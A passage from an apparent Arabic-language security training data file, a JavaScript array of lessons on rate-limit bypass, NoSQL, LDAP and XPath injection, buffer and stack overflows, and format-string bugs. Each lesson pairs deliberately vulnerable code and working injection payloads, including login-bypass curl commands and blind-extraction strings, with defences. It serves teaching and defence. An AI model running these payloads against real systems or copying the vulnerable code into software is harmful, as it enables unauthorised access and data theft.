        <h3>اختبار باستخدام Burp Intruder:</h3>

        <p>إرسال مئات الطلبات المتتابعة.</p>

        <h3>اختبار باستخدام ffuf:</h3>

        <pre><code>ffuf -u http://target.com/FUZZ</code></pre>

        <h3>اختبار باستخدام Turbo Intruder:</h3>

        <p>لإرسال طلبات متزامنة عالية السرعة.</p>

        <h3>أماكن شائعة لوجود الثغرة:</h3>

        <p>1. Login APIs.</p>
        <p>2. OTP Verification.</p>
        <p>3. Password Reset.</p>
        <p>4. Search APIs.</p>
        <p>5. Payment APIs.</p>

        <h3>أدوات اختبار Rate Limit:</h3>

        <pre><code>Burp Suite
Turbo Intruder
ffuf
Postman
OWASP ZAP</code></pre>

        <h3>مثال على استجابة آمنة:</h3>

        <pre><code>HTTP/1.1 429 Too Many Requests</code></pre>

        <h3>Retry-After Header:</h3>

        <pre><code>Retry-After: 60</code></pre>

        <p>يعني الانتظار 60 ثانية.</p>

        <h3>مثال على حماية قوية:</h3>

        <pre><code>5 Login Attempts / Minute</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. تطبيق Rate Limiting على IP والحساب معاً.</b></p>

        <p><b>2. استخدام Captcha بعد عدة محاولات.</b></p>

        <p><b>3. منع الاعتماد على Headers القادمة من المستخدم.</b></p>

        <p><b>4. استخدام Sliding Window Algorithms.</b></p>

        <p><b>5. مراقبة الطلبات غير الطبيعية.</b></p>

        <p><b>6. استخدام WAF.</b></p>

        <p><b>7. حظر الحساب مؤقتاً بعد الفشل المتكرر.</b></p>

        <h3>التحقق من Headers:</h3>

        <p>يجب تجاهل:</p>

        <pre><code>X-Forwarded-For
Client-IP</code></pre>

        <p>إذا لم تأت من Proxy موثوق.</p>

        <h3>مثال على Rate Limit Headers:</h3>

        <pre><code>X-RateLimit-Limit: 100
X-RateLimit-Remaining: 10</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تسمح API Rate Limit Bypass بتنفيذ هجمات Brute Force، تخمين OTPs، استنزاف موارد الخادم، تجاوز القيود الأمنية، أو تنفيذ هجمات آلية ضخمة ضد التطبيق وواجهات APIs.</p>
    `
},



{
    "title": "NoSQL Injection in MongoDB",
    "summary": `
        <p>تعتبر ثغرة <b>NoSQL Injection</b> من الثغرات الخطيرة التي تصيب قواعد البيانات غير العلائقية مثل MongoDB، وتحدث عندما يتم تمرير مدخلات المستخدم مباشرة داخل استعلامات قاعدة البيانات بدون تحقق أو فلترة صحيحة.</p>

        <p>يمكن للمهاجم استغلال هذه الثغرة لتجاوز تسجيل الدخول، استخراج البيانات، تعديل السجلات، أو تنفيذ أوامر خطيرة داخل قاعدة البيانات.</p>

        <h3>ما هي MongoDB ؟</h3>

        <p>MongoDB هي قاعدة بيانات NoSQL تعتمد على تخزين البيانات بصيغة JSON-like Documents.</p>

        <h3>مثال على Document:</h3>

        <pre><code>{
 "username":"admin",
 "password":"123456"
}</code></pre>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>إذا قام التطبيق بتمرير بيانات المستخدم مباشرة إلى MongoDB Query يمكن للمهاجم حقن Operators خاصة.</p>

        <h3>مثال على كود Node.js ضعيف:</h3>

        <pre><code>// Vulnerable Example

db.users.findOne({
 username:req.body.username,
 password:req.body.password
});</code></pre>

        <h3>يقوم المهاجم بإرسال:</h3>

        <pre><code>{
 "username":{"$ne":null},
 "password":{"$ne":null}
}</code></pre>

        <p>Operator <code>$ne</code> يعني:</p>

        <pre><code>Not Equal</code></pre>

        <p>وبذلك سيقبل أي مستخدم موجود.</p>

        <h3>النتيجة:</h3>

        <p>تجاوز تسجيل الدخول Authentication Bypass.</p>

        <h3>أشهر Operators المستخدمة:</h3>

        <pre><code>$ne
$gt
$lt
$regex
$where</code></pre>

        <h3>مثال باستخدام $regex:</h3>

        <pre><code>{
 "username":{"$regex":"admin"},
 "password":{"$ne":null}
}</code></pre>

        <p>قد يسمح بالبحث عن المستخدم admin.</p>

        <h3>استغلال عبر GET Parameters:</h3>

        <pre><code>?username[$ne]=1&password[$ne]=1</code></pre>

        <h3>استغلال داخل JSON API:</h3>

        <pre><code>POST /api/login

{
 "username":{"$ne":null},
 "password":{"$ne":null}
}</code></pre>

        <h3>استغلال Operator $where:</h3>

        <pre><code>{
 "$where":"this.username == 'admin'"
}</code></pre>

        <p>يسمح بتنفيذ JavaScript داخل MongoDB.</p>

        <h3>Blind NoSQL Injection:</h3>

        <p>يمكن استخراج البيانات تدريجياً عبر شروط صحيحة وخاطئة.</p>

        <h3>مثال:</h3>

        <pre><code>{
 "username":"admin",
 "password":{
   "$regex":"^a"
 }
}</code></pre>

        <p>إذا نجح الطلب فهذا يعني أن كلمة المرور تبدأ بالحرف a.</p>

        <h3>Time-Based Injection:</h3>

        <pre><code>{
 "$where":"sleep(5000)"
}</code></pre>

        <p>قد يؤدي إلى تأخير الاستجابة.</p>

        <h3>أماكن شائعة لوجود الثغرة:</h3>

        <p>1. Login APIs.</p>
        <p>2. Search APIs.</p>
        <p>3. GraphQL APIs.</p>
        <p>4. JSON Requests.</p>
        <p>5. MongoDB Dashboards.</p>

        <h3>علامات تدل على وجود الثغرة:</h3>

        <p>1. التطبيق يستخدم MongoDB.</p>
        <p>2. قبول JSON Objects من المستخدم.</p>
        <p>3. اختلاف النتائج بعد استخدام Operators.</p>

        <h3>اختبار باستخدام Burp Suite:</h3>

        <p>يقوم المختبر بحقن:</p>

        <pre><code>{
 "$ne":null
}</code></pre>

        <p>داخل جميع الحقول.</p>

        <h3>اختبار باستخدام curl:</h3>

        <pre><code>curl -X POST
http://target.com/login
-d '{"username":{"$ne":null},
"password":{"$ne":null}}'</code></pre>

        <h3>استغلال عبر Arrays:</h3>

        <pre><code>{
 "username":["admin"],
 "password":{"$ne":null}
}</code></pre>

        <h3>أدوات اختبار NoSQL Injection:</h3>

        <pre><code>Burp Suite
NoSQLMap
OWASP ZAP
Postman</code></pre>

        <h3>اختبار باستخدام NoSQLMap:</h3>

        <pre><code>python nosqlmap.py</code></pre>

        <h3>مثال على كود آمن:</h3>

        <pre><code>// Secure Example

const username =
String(req.body.username);

const password =
String(req.body.password);</code></pre>

        <h3>استخدام Input Validation:</h3>

        <p>يجب تحويل المدخلات إلى Strings وعدم السماح بـ Objects.</p>

        <h3>منع Operators:</h3>

        <pre><code>$ne
$where
$regex</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام Parameterized Queries.</b></p>

        <p><b>2. منع Objects داخل المدخلات.</b></p>

        <p><b>3. التحقق من نوع البيانات.</b></p>

        <p><b>4. استخدام ORM آمن.</b></p>

        <p><b>5. تعطيل JavaScript داخل MongoDB.</b></p>

        <p><b>6. فلترة Mongo Operators.</b></p>

        <h3>تعطيل JavaScript:</h3>

        <pre><code>--noscripting</code></pre>

        <h3>التحقق من Types:</h3>

        <pre><code>typeof username === "string"</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تسمح NoSQL Injection داخل MongoDB بتجاوز المصادقة، استخراج البيانات، تنفيذ أوامر JavaScript داخل قاعدة البيانات، أو السيطرة الكاملة على التطبيق إذا لم يتم التحقق من المدخلات بشكل صحيح.</p>
    `
},



{
    "title": "LDAP Injection Attack",
    "summary": `
        <p>تعتبر ثغرة <b>LDAP Injection</b> من الثغرات الخطيرة التي تصيب التطبيقات المرتبطة بخوادم LDAP مثل Active Directory، وتحدث عندما يتم تمرير مدخلات المستخدم داخل LDAP Queries بدون فلترة أو حماية.</p>

        <p>يمكن للمهاجم استغلال هذه الثغرة لتجاوز تسجيل الدخول، استخراج بيانات المستخدمين، تنفيذ عمليات بحث غير مصرح بها، أو الوصول إلى حسابات إدارية.</p>

        <h3>ما هو LDAP ؟</h3>

        <p>LDAP اختصار لـ:</p>

        <pre><code>Lightweight Directory Access Protocol</code></pre>

        <p>وهو بروتوكول يستخدم لإدارة المستخدمين والصلاحيات داخل الشبكات وأنظمة Active Directory.</p>

        <h3>أمثلة على استخدام LDAP:</h3>

        <p>1. تسجيل الدخول.</p>
        <p>2. Active Directory.</p>
        <p>3. أنظمة الشركات.</p>
        <p>4. البريد الإلكتروني.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>إذا قام التطبيق بدمج مدخلات المستخدم مباشرة داخل LDAP Filter يمكن للمهاجم تعديل الاستعلام.</p>

        <h3>مثال على كود ضعيف:</h3>

        <pre><code>// Vulnerable Example

filter = "(uid=" + username + ")";</code></pre>

        <h3>إذا أدخل المهاجم:</h3>

        <pre><code>*</code></pre>

        <p>سيصبح الاستعلام:</p>

        <pre><code>(uid=*)</code></pre>

        <p>مما يؤدي لإرجاع جميع المستخدمين.</p>

        <h3>مثال على Login LDAP:</h3>

        <pre><code>(&amp;(uid=admin)(password=123456))</code></pre>

        <h3>يقوم المهاجم بحقن:</h3>

        <pre><code>admin*)(|(uid=*))</code></pre>

        <p>فيصبح:</p>

        <pre><code>(&amp;(uid=admin*)(|(uid=*)))(password=123456)</code></pre>

        <p>مما قد يؤدي إلى تجاوز المصادقة.</p>

        <h3>أشهر الرموز المستخدمة:</h3>

        <pre><code>*
(
)
|
&amp;
!</code></pre>

        <h3>Wildcard Injection:</h3>

        <pre><code>*</code></pre>

        <p>يعني أي قيمة.</p>

        <h3>OR Injection:</h3>

        <pre><code>|</code></pre>

        <p>يستخدم لإنشاء شروط OR.</p>

        <h3>AND Injection:</h3>

        <pre><code>&amp;</code></pre>

        <h3>NOT Injection:</h3>

        <pre><code>!</code></pre>

        <h3>Blind LDAP Injection:</h3>

        <p>يمكن استخراج البيانات تدريجياً عبر استجابات صحيحة وخاطئة.</p>

        <h3>مثال:</h3>

        <pre><code>admin*)(password=a*</code></pre>

        <p>إذا نجح الطلب فهذا يعني أن كلمة المرور تبدأ بالحرف a.</p>

        <h3>Time-Based LDAP Injection:</h3>

        <p>بعض الأنظمة قد تتأخر عند تنفيذ Queries معقدة.</p>

        <h3>أماكن شائعة لوجود الثغرة:</h3>

        <p>1. Login Forms.</p>
        <p>2. Active Directory Integration.</p>
        <p>3. Enterprise Applications.</p>
        <p>4. Email Systems.</p>
        <p>5. VPN Authentication.</p>

        <h3>علامات تدل على وجود الثغرة:</h3>

        <p>1. التطبيق يستخدم LDAP أو Active Directory.</p>
        <p>2. اختلاف النتائج عند استخدام * أو |.</p>
        <p>3. ظهور LDAP Errors.</p>

        <h3>أمثلة على أخطاء LDAP:</h3>

        <pre><code>LDAPException
Invalid DN Syntax
Directory Error</code></pre>

        <h3>اختبار باستخدام Burp Suite:</h3>

        <pre><code>*
admin*)
(|(uid=*))
)(uid=*))(|(uid=*</code></pre>

        <h3>اختبار عبر curl:</h3>

        <pre><code>curl -X POST
http://target.com/login
-d "username=admin*)(|(uid=*))"</code></pre>

        <h3>أدوات اختبار LDAP Injection:</h3>

        <pre><code>Burp Suite
OWASP ZAP
ldapsearch
Nmap</code></pre>

        <h3>اختبار باستخدام ldapsearch:</h3>

        <pre><code>ldapsearch -x
-b "dc=target,dc=com"</code></pre>

        <h3>مثال على كود آمن:</h3>

        <pre><code>// Secure Example

username = escapeLDAP(username);</code></pre>

        <h3>فلترة الرموز الخاصة:</h3>

        <pre><code>*
(
)
|
&amp;
!</code></pre>

        <h3>استخدام Parameterized LDAP Queries:</h3>

        <p>بدلاً من دمج المدخلات مباشرة.</p>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام LDAP Escaping.</b></p>

        <p><b>2. فلترة الرموز الخاصة.</b></p>

        <p><b>3. استخدام Parameterized Queries.</b></p>

        <p><b>4. التحقق من المدخلات Input Validation.</b></p>

        <p><b>5. تطبيق Least Privilege.</b></p>

        <p><b>6. تعطيل Anonymous Binding.</b></p>

        <h3>مثال على Escape:</h3>

        <pre><code>( → \\28
) → \\29
* → \\2a</code></pre>

        <h3>Least Privilege:</h3>

        <p>يجب أن يمتلك حساب LDAP أقل صلاحيات ممكنة.</p>

        <h3>خطورة الثغرة:</h3>

        <p>تسمح LDAP Injection بتجاوز تسجيل الدخول، استخراج بيانات المستخدمين، الوصول إلى Active Directory، أو تنفيذ عمليات بحث حساسة داخل أنظمة الشركات إذا لم تتم حماية LDAP Queries بشكل صحيح.</p>
    `
},



{
    "title": "XPath Injection Vulnerability",
    "summary": `
        <p>تعتبر ثغرة <b>XPath Injection</b> من الثغرات الخطيرة التي تصيب التطبيقات التي تستخدم XML وXPath لمعالجة البيانات، وتحدث عندما يتم دمج مدخلات المستخدم داخل XPath Query بدون فلترة أو حماية.</p>

        <p>يمكن للمهاجم استغلال هذه الثغرة لتجاوز تسجيل الدخول، استخراج البيانات من ملفات XML، أو تنفيذ عمليات بحث غير مصرح بها.</p>

        <h3>ما هو XPath ؟</h3>

        <p>XPath اختصار لـ:</p>

        <pre><code>XML Path Language</code></pre>

        <p>وهي لغة تستخدم للتنقل والبحث داخل ملفات XML.</p>

        <h3>مثال على XML:</h3>

        <pre><code>&lt;users&gt;
  &lt;user&gt;
    &lt;username&gt;admin&lt;/username&gt;
    &lt;password&gt;123456&lt;/password&gt;
  &lt;/user&gt;
&lt;/users&gt;</code></pre>

        <h3>مثال على XPath Query:</h3>

        <pre><code>//user[username='admin'
and password='123456']</code></pre>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>إذا قام التطبيق بدمج مدخلات المستخدم مباشرة داخل XPath Query يستطيع المهاجم تعديل الاستعلام.</p>

        <h3>مثال على كود ضعيف:</h3>

        <pre><code>// Vulnerable Example

query = "//user[username='"
+ username +
"' and password='"
+ password + "']";</code></pre>

        <h3>يقوم المهاجم بحقن:</h3>

        <pre><code>' or '1'='1</code></pre>

        <p>فيصبح الاستعلام:</p>

        <pre><code>//user[username=''
or '1'='1'
and password='']</code></pre>

        <p>وبذلك يصبح الشرط دائماً صحيحاً.</p>

        <h3>النتيجة:</h3>

        <p>تجاوز تسجيل الدخول Authentication Bypass.</p>

        <h3>اختبارات شائعة:</h3>

        <pre><code>' or '1'='1
" or "1"="1
' or 1=1 or '
admin' or '1'='1</code></pre>

        <h3>استخدام OR Injection:</h3>

        <pre><code>' or 'a'='a</code></pre>

        <h3>استخدام Comment Injection:</h3>

        <pre><code>' or '1'='1' ] | //</code></pre>

        <h3>Blind XPath Injection:</h3>

        <p>يمكن استخراج البيانات تدريجياً عبر استجابات صحيحة وخاطئة.</p>

        <h3>مثال:</h3>

        <pre><code>' or substring(password,1,1)='a</code></pre>

        <p>إذا نجح الطلب فهذا يعني أن أول حرف من كلمة المرور هو a.</p>

        <h3>استخراج طول كلمة المرور:</h3>

        <pre><code>' or string-length(password)=8</code></pre>

        <h3>استخراج أسماء العقد:</h3>

        <pre><code>' or name(/*)='users'</code></pre>

        <h3>أماكن شائعة لوجود الثغرة:</h3>

        <p>1. Login Forms.</p>
        <p>2. XML APIs.</p>
        <p>3. SOAP Services.</p>
        <p>4. Search Systems.</p>
        <p>5. Legacy Applications.</p>

        <h3>علامات تدل على وجود الثغرة:</h3>

        <p>1. التطبيق يستخدم XML.</p>
        <p>2. اختلاف النتائج عند استخدام Quotes.</p>
        <p>3. ظهور أخطاء XPath أو XML.</p>

        <h3>أمثلة على أخطاء XPath:</h3>

        <pre><code>XPathException
XML Parsing Error
Invalid XPath Expression</code></pre>

        <h3>اختبار باستخدام Burp Suite:</h3>

        <pre><code>' or '1'='1
" or "1"="1</code></pre>

        <p>داخل جميع الحقول.</p>

        <h3>اختبار باستخدام curl:</h3>

        <pre><code>curl -X POST
http://target.com/login
-d "username=' or '1'='1"</code></pre>

        <h3>استغلال عبر URL Parameters:</h3>

        <pre><code>?user=' or '1'='1</code></pre>

        <h3>أدوات اختبار XPath Injection:</h3>

        <pre><code>Burp Suite
OWASP ZAP
XPath Helper
Postman</code></pre>

        <h3>اختبار استخراج البيانات:</h3>

        <pre><code>' or substring(name(/*),1,1)='u</code></pre>

        <h3>مثال على كود آمن:</h3>

        <pre><code>// Secure Example

username = escapeXPath(username);
password = escapeXPath(password);</code></pre>

        <h3>فلترة الرموز الخاصة:</h3>

        <pre><code>'
"
[
]
=
|</code></pre>

        <h3>استخدام Parameterized Queries:</h3>

        <p>بدلاً من دمج المدخلات داخل XPath مباشرة.</p>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام XPath Escaping.</b></p>

        <p><b>2. فلترة الرموز الخاصة.</b></p>

        <p><b>3. استخدام Parameterized Queries.</b></p>

        <p><b>4. التحقق من المدخلات Input Validation.</b></p>

        <p><b>5. تعطيل رسائل الخطأ التفصيلية.</b></p>

        <p><b>6. استخدام أقل صلاحيات ممكنة.</b></p>

        <h3>التحقق من المدخلات:</h3>

        <pre><code>^[a-zA-Z0-9]+$</code></pre>

        <h3>تعطيل Error Messages:</h3>

        <p>حتى لا يتم كشف بنية XPath للمهاجم.</p>

        <h3>خطورة الثغرة:</h3>

        <p>تسمح XPath Injection بتجاوز تسجيل الدخول، استخراج البيانات الحساسة من XML، تنفيذ عمليات بحث غير مصرح بها، أو الوصول إلى معلومات حساسة داخل التطبيق إذا لم تتم حماية XPath Queries بشكل صحيح.</p>
    `
},



{
    "title": "Buffer Overflow Basics",
    "summary": `
        <p>تعتبر ثغرة <b>Buffer Overflow</b> من أشهر وأخطر الثغرات الكلاسيكية في البرمجة منخفضة المستوى، وتحدث عندما يقوم البرنامج بكتابة بيانات داخل مساحة ذاكرة (Buffer) أكبر من الحجم المخصص لها.</p>

        <p>قد يؤدي ذلك إلى انهيار البرنامج، تعديل الذاكرة، تنفيذ تعليمات خبيثة، أو السيطرة الكاملة على النظام.</p>

        <h3>ما هو Buffer ؟</h3>

        <p>الـ Buffer هو مساحة داخل الذاكرة تستخدم لتخزين البيانات مؤقتاً.</p>

        <h3>مثال:</h3>

        <pre><code>char name[10];</code></pre>

        <p>هذا يعني أن المتغير يستطيع تخزين 10 أحرف فقط.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>إذا قام البرنامج بكتابة بيانات أكبر من حجم الـ Buffer سيتم الكتابة فوق أجزاء أخرى من الذاكرة.</p>

        <h3>مثال على كود C ضعيف:</h3>

        <pre><code>// Vulnerable Example

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main() {
    char buffer[10];

    gets(buffer);

    printf("%s", buffer);
}</code></pre>

        <h3>المشكلة:</h3>

        <p>الدالة <code>gets()</code> لا تتحقق من حجم البيانات المدخلة.</p>

        <h3>إذا أدخل المستخدم:</h3>

        <pre><code>AAAAAAAAAAAAAAAAAAAA</code></pre>

        <p>سيتم تجاوز حدود الـ Buffer.</p>

        <h3>النتيجة المحتملة:</h3>

        <p>1. Crash.</p>
        <p>2. تعديل الذاكرة.</p>
        <p>3. التحكم في البرنامج.</p>

        <h3>ما هو Stack ؟</h3>

        <p>الـ Stack جزء من الذاكرة يستخدم لتخزين:</p>

        <p>1. المتغيرات المحلية.</p>
        <p>2. Return Addresses.</p>
        <p>3. Function Calls.</p>

        <h3>Stack Overflow:</h3>

        <p>عند تجاوز الـ Buffer داخل Stack قد يستطيع المهاجم تعديل Return Address.</p>

        <h3>ما هو Return Address ؟</h3>

        <p>هو العنوان الذي يعود إليه البرنامج بعد انتهاء الدالة.</p>

        <h3>إذا تم تعديله:</h3>

        <p>قد يقفز التنفيذ إلى تعليمات المهاجم.</p>

        <h3>مثال بسيط:</h3>

        <pre><code>[ Buffer ]
[ Saved EBP ]
[ Return Address ]</code></pre>

        <p>إذا امتلأ Buffer سيتم الكتابة فوق Return Address.</p>

        <h3>Shellcode:</h3>

        <p>هو كود منخفض المستوى يحقنه المهاجم داخل الذاكرة لتنفيذ أوامر.</p>

        <h3>NOP Sled:</h3>

        <pre><code>\\x90\\x90\\x90</code></pre>

        <p>يستخدم لتسهيل الوصول إلى Shellcode.</p>

        <h3>أنواع Buffer Overflow:</h3>

        <p>1. Stack Overflow.</p>
        <p>2. Heap Overflow.</p>
        <p>3. Integer Overflow.</p>
        <p>4. Format String.</p>

        <h3>Heap Overflow:</h3>

        <p>يحدث داخل Heap Memory بدلاً من Stack.</p>

        <h3>علامات تدل على وجود الثغرة:</h3>

        <p>1. استخدام دوال غير آمنة.</p>
        <p>2. Crash عند إدخال بيانات طويلة.</p>
        <p>3. Segmentation Fault.</p>

        <h3>دوال خطيرة في C:</h3>

        <pre><code>gets()
strcpy()
strcat()
sprintf()</code></pre>

        <h3>اختبار بسيط:</h3>

        <pre><code>python -c "print('A'*500)"</code></pre>

        <p>ثم إرسال الناتج للبرنامج.</p>

        <h3>أدوات تحليل Buffer Overflow:</h3>

        <pre><code>gdb
pwndbg
gef
radare2</code></pre>

        <h3>اختبار باستخدام gdb:</h3>

        <pre><code>gdb ./vulnerable</code></pre>

        <h3>تشغيل البرنامج داخل gdb:</h3>

        <pre><code>run</code></pre>

        <h3>فحص Crash:</h3>

        <pre><code>info registers</code></pre>

        <h3>مثال على حماية Stack:</h3>

        <pre><code>-fstack-protector</code></pre>

        <h3>ASLR:</h3>

        <pre><code>Address Space Layout Randomization</code></pre>

        <p>يقوم بتغيير عناوين الذاكرة عشوائياً.</p>

        <h3>DEP / NX:</h3>

        <p>يمنع تنفيذ الكود داخل الذاكرة القابلة للكتابة.</p>

        <h3>Canary Protection:</h3>

        <p>يضيف قيمة حماية قبل Return Address.</p>

        <h3>مثال على كود آمن:</h3>

        <pre><code>// Secure Example

fgets(buffer, sizeof(buffer), stdin);</code></pre>

        <p>تتحقق من حجم الإدخال.</p>

        <h3>استخدام strncpy:</h3>

        <pre><code>strncpy(dest, src, sizeof(dest));</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام دوال آمنة.</b></p>

        <p><b>2. التحقق من حجم الإدخال.</b></p>

        <p><b>3. تفعيل ASLR.</b></p>

        <p><b>4. تفعيل Stack Canaries.</b></p>

        <p><b>5. استخدام DEP / NX.</b></p>

        <p><b>6. تحديث البرامج والمكتبات.</b></p>

        <h3>Compiler Protections:</h3>

        <pre><code>-D_FORTIFY_SOURCE=2
-fstack-protector-all</code></pre>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر Buffer Overflow من أخطر الثغرات لأنها قد تؤدي إلى تنفيذ تعليمات برمجية خبيثة، السيطرة الكاملة على النظام، أو تشغيل Shellcode داخل الذاكرة إذا لم يتم التحقق من حدود البيانات بشكل صحيح.</p>
    `
},



{
    "title": "Stack Buffer Overflow",
    "summary": `
        <p>تعتبر ثغرة <b>Stack Buffer Overflow</b> من أخطر الثغرات منخفضة المستوى، وتحدث عندما يكتب البرنامج بيانات داخل Buffer موجود في Stack أكبر من الحجم المخصص له.</p>

        <p>قد يؤدي ذلك إلى الكتابة فوق Return Address أو متغيرات حساسة داخل الذاكرة، مما يسمح للمهاجم بالتحكم في مسار تنفيذ البرنامج.</p>

        <h3>ما هو Stack ؟</h3>

        <p>الـ Stack هو جزء من الذاكرة يستخدم لتخزين:</p>

        <p>1. المتغيرات المحلية.</p>
        <p>2. Function Calls.</p>
        <p>3. Return Addresses.</p>
        <p>4. Parameters.</p>

        <h3>كيف تعمل الدوال داخل Stack ؟</h3>

        <p>عند استدعاء دالة يقوم النظام بإنشاء Stack Frame يحتوي على:</p>

        <pre><code>[ Local Variables ]
[ Saved Base Pointer ]
[ Return Address ]</code></pre>

        <h3>ما هو Buffer ؟</h3>

        <p>هو مساحة مخصصة داخل الذاكرة لتخزين البيانات مؤقتاً.</p>

        <h3>مثال:</h3>

        <pre><code>char buffer[16];</code></pre>

        <p>هذا يعني أن المتغير يستطيع تخزين 16 Byte فقط.</p>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>إذا استقبل البرنامج بيانات أطول من حجم الـ Buffer سيتم تجاوز الحدود والكتابة فوق أجزاء أخرى من Stack.</p>

        <h3>مثال على كود C ضعيف:</h3>

        <pre><code>// Vulnerable Example

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void vulnerable() {
    char buffer[16];

    gets(buffer);
}

int main() {
    vulnerable();
}</code></pre>

        <h3>المشكلة:</h3>

        <p>الدالة <code>gets()</code> لا تتحقق من طول البيانات.</p>

        <h3>إذا أدخل المهاجم:</h3>

        <pre><code>AAAAAAAAAAAAAAAAAAAAAAAAAAAA</code></pre>

        <p>سيتم تجاوز حدود Buffer.</p>

        <h3>النتيجة:</h3>

        <p>قد يتم تعديل:</p>

        <pre><code>Return Address</code></pre>

        <h3>ما هو Return Address ؟</h3>

        <p>هو العنوان الذي يعود إليه البرنامج بعد انتهاء الدالة الحالية.</p>

        <h3>إذا تم تعديله:</h3>

        <p>يمكن تحويل مسار التنفيذ إلى تعليمات المهاجم.</p>

        <h3>تمثيل بسيط للذاكرة:</h3>

        <pre><code>[ buffer ]
[ saved rbp ]
[ return address ]</code></pre>

        <p>عند Overflow سيتم استبدال Return Address.</p>

        <h3>Crash Detection:</h3>

        <p>غالباً يظهر:</p>

        <pre><code>Segmentation Fault</code></pre>

        <h3>اختبار بسيط:</h3>

        <pre><code>python -c "print('A'*100)"</code></pre>

        <h3>ثم:</h3>

        <pre><code>./vulnerable</code></pre>

        <h3>ما هو EIP / RIP ؟</h3>

        <p>هو السجل المسؤول عن تحديد التعليمة التالية التي سيتم تنفيذها.</p>

        <h3>إذا تمت السيطرة عليه:</h3>

        <p>يمكن تنفيذ تعليمات خبيثة.</p>

        <h3>فحص Registers:</h3>

        <pre><code>info registers</code></pre>

        <h3>داخل gdb:</h3>

        <pre><code>gdb ./vulnerable</code></pre>

        <h3>تشغيل البرنامج:</h3>

        <pre><code>run</code></pre>

        <h3>ما هو Shellcode ؟</h3>

        <p>هو كود منخفض المستوى يتم حقنه داخل الذاكرة لتنفيذ أوامر.</p>

        <h3>مثال على NOP Sled:</h3>

        <pre><code>\\x90\\x90\\x90\\x90</code></pre>

        <p>يستخدم لتسهيل الوصول إلى Shellcode.</p>

        <h3>مراحل الاستغلال الكلاسيكي:</h3>

        <p>1. اكتشاف حجم Buffer.</p>
        <p>2. تحديد Offset.</p>
        <p>3. السيطرة على Return Address.</p>
        <p>4. حقن Shellcode.</p>
        <p>5. تنفيذ التعليمات.</p>

        <h3>تحديد Offset:</h3>

        <pre><code>pattern create 200</code></pre>

        <h3>ثم:</h3>

        <pre><code>pattern offset VALUE</code></pre>

        <h3>أدوات تحليل Stack Overflow:</h3>

        <pre><code>gdb
pwndbg
gef
radare2</code></pre>

        <h3>حمايات حديثة ضد الاستغلال:</h3>

        <h3>1. ASLR:</h3>

        <pre><code>Address Space Layout Randomization</code></pre>

        <p>يقوم بتغيير عناوين الذاكرة بشكل عشوائي.</p>

        <h3>2. NX / DEP:</h3>

        <p>يمنع تنفيذ الكود داخل الذاكرة القابلة للكتابة.</p>

        <h3>3. Stack Canary:</h3>

        <p>يضيف قيمة حماية قبل Return Address.</p>

        <h3>4. PIE:</h3>

        <p>يجعل عناوين البرنامج عشوائية.</p>

        <h3>فحص الحمايات:</h3>

        <pre><code>checksec ./vulnerable</code></pre>

        <h3>دوال خطيرة:</h3>

        <pre><code>gets()
strcpy()
strcat()
sprintf()</code></pre>

        <h3>مثال على كود آمن:</h3>

        <pre><code>// Secure Example

fgets(buffer,
sizeof(buffer),
stdin);</code></pre>

        <h3>استخدام strncpy:</h3>

        <pre><code>strncpy(dest, src, sizeof(dest));</code></pre>

        <h3>Compiler Protections:</h3>

        <pre><code>-fstack-protector-all
-D_FORTIFY_SOURCE=2</code></pre>

        <h3>طرق الحماية الصحيحة:</h3>

        <p><b>1. استخدام دوال آمنة.</b></p>

        <p><b>2. التحقق من حجم البيانات.</b></p>

        <p><b>3. تفعيل ASLR.</b></p>

        <p><b>4. تفعيل Stack Canary.</b></p>

        <p><b>5. تفعيل NX / DEP.</b></p>

        <p><b>6. مراجعة الكود منخفض المستوى.</b></p>

        <h3>خطورة الثغرة:</h3>

        <p>تعتبر Stack Buffer Overflow من أخطر الثغرات لأنها قد تسمح بتنفيذ Shellcode، السيطرة على مسار التنفيذ، أو الوصول إلى Remote Code Execution والسيطرة الكاملة على النظام.</p>
    `
},



{
    "title": "Format String Vulnerability",
    "summary": `
        <p>تعتبر ثغرة <b>Format String Vulnerability</b> من الثغرات الكلاسيكية في لغات مثل C و C++، وتحدث عندما يقوم البرنامج بتمرير مدخلات المستخدم مباشرة إلى دوال تنسيق النصوص مثل printf بدون تحديد صيغة آمنة.</p>

        <p>يمكن للمهاجم استغلال هذه الثغرة لقراءة محتوى الذاكرة، تسريب بيانات حساسة، تعديل قيم داخل الذاكرة، أو أحياناً الوصول إلى تنفيذ كود (RCE) في أنظمة غير محمية.</p>

        <h3>ما هي دوال Format String ؟</h3>

        <p>هي دوال تستخدم لتنسيق النصوص مثل:</p>

        <pre><code>printf()
fprintf()
sprintf()
snprintf()</code></pre>

        <h3>كيف تحدث الثغرة؟</h3>

        <p>تحدث عندما يتم تمرير مدخل المستخدم مباشرة كـ Format String بدلاً من تمريره كـ Argument.</p>

        <h3>مثال على كود C ضعيف:</h3>

        <pre><code>// Vulnerable Example

#include &lt;stdio.h&gt;

int main() {
    char buffer[100];

    gets(buffer);

    printf(buffer);
}</code></pre>

        <h3>المشكلة:</h3>

        <p>لم يتم تحديد صيغة طباعة آمنة مثل <code>%s</code>، بل تم تمرير مدخل المستخدم مباشرة إلى printf.</p>

        <h3>استغلال الثغرة:</h3>

        <p>إذا أدخل المهاجم:</p>

        <pre><code>%x %x %x %x</code></pre>

        <p>سيقوم البرنامج بطباعة قيم من الذاكرة (Stack Leak).</p>

        <h3>أشهر Format Specifiers:</h3>

        <pre><code>%x   → Hex values from memory
%s   → Read string from memory
%n   → Write number of bytes to memory
%p   → Pointer address
%d   → Decimal values</code></pre>

        <h3>قراءة الذاكرة (Memory Leak):</h3>

        <pre><code>%x %x %x %x %x</code></pre>

        <p>يمكن أن يكشف محتويات Stack.</p>

